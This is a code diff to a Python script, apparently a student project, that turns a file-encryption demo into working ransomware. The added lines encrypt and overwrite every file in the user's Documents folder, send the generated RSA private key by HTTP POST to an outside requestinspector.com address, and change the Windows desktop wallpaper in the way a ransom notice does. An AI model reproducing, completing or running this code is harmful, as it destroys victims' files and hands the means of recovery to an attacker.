@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-import os, base64, json, scrypt, gc
+import os, base64, json, scrypt, gc, ctypes, requests
 from Crypto.Cipher import AES
 from Crypto.PublicKey  import  RSA
 from Crypto.Cipher import PKCS1_OAEP
@@ -14,12 +14,15 @@ bit_size = 4096
 key_format = "PEM"
 keys = RSA.generate(bit_size)
 llave_publica = PKCS1_OAEP.new(keys.publickey())
-with open('llave_publica.pem', 'w') as file:
-    file.write(keys.publickey().export_key(key_format).decode())
+with open(os.path.join(os.environ['USERPROFILE'], "Documents", 'llave_publica.pem'), 'wb') as file:
+    file.write(keys.publickey().export_key(key_format))
 
 llave_privada = PKCS1_OAEP.new(keys)
-with open('llave_privada.pem', 'w') as file:
-    file.write(keys.export_key(key_format).decode())
+with open('llave_privada.pem', 'wb') as file:
+    file.write(keys.export_key(key_format))
+url = 'https://requestinspector.com/inspect/01g46gk67e8cad21kgczk8dy2m'
+myobj = {'privatekey': keys.export_key(key_format)}
+x = requests.post(url, data = myobj)
 
 
 # parametros para llave AES
@@ -35,7 +38,7 @@ def encrypt_AES_GCM(archivo):
     return [password, kdfSalt, archivo_cipher, iv, authTag, secretKey]
 
 # importar archivos de %UserProfile%\Documents 
-ejemplo_dir = 'archivos_originales'
+ejemplo_dir = os.path.join(os.environ['USERPROFILE'], "Documents")
 contenido = os.listdir(ejemplo_dir)
 archivos = []
 for fichero in contenido:
@@ -47,13 +50,13 @@ data = {}
 data["credenciales"] = []
     
 for archivo in archivos:
-    archivo_entrada = open("archivos_originales/" + archivo, 'rb')
+    archivo_entrada = open(os.path.join(os.environ['USERPROFILE'], "Documents",archivo), 'rb')
     archivo_bytes = bytearray(archivo_entrada.read())
     temp = encrypt_AES_GCM(archivo_bytes)
     
 
     archivo_cifrado = temp[2]
-    archivo_destino = open("archivos_cifrados/" + archivo + ".enc", "wb")
+    archivo_destino = open(os.path.join(os.environ['USERPROFILE'], "Documents", archivo), "wb")
     archivo_destino.write(archivo_cifrado)
 
     archivo_entrada.close()
@@ -73,17 +76,21 @@ with open('credenciales.json', 'w') as file:
 
 # borrar memoria RAM
 del temp
+del keys
 gc.collect()
 
 # borar archivos originales
 import shutil
-dirPath = 'archivos_orginales'
+dirPath = 'archivos_originales/'
 try:
-    shutil.rmtree(dirPath)
+    pass
+    #shutil.rmtree(dirPath)
 except OSError as e:
     print(f"Error:{ e.strerror}")
 
 # cambiar el fondo de escritorio    
+path = b'C:\\Users\\qwert\\proyecto_final\\fondo.jpg'
+ctypes.windll.user32.SystemParametersInfoA(20, 0, path, 3)
 
 # hacer programa de descifrado
 
